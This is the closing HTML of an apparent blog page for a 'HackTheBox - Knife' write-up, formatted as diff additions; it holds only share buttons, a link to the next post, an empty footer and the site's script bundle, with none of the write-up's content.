+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f;title=HackTheBox%20-%20Knife" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=HackTheBox%20-%20Knife%20https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f&amp;t=HackTheBox%20-%20Knife" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HackTheBox%20-%20Knife&amp;url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        <div class="pagination__title">
+            <span class="pagination__title-h"></span>
+            <hr />
+        </div>
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="https://brunomcuesta.github.io/posts/2021/08/hackthebox-love/">
+                    <span class="button__text">HackTheBox - Love</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://brunomcuesta.github.io/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+
+
+
+    </body>
+</html>
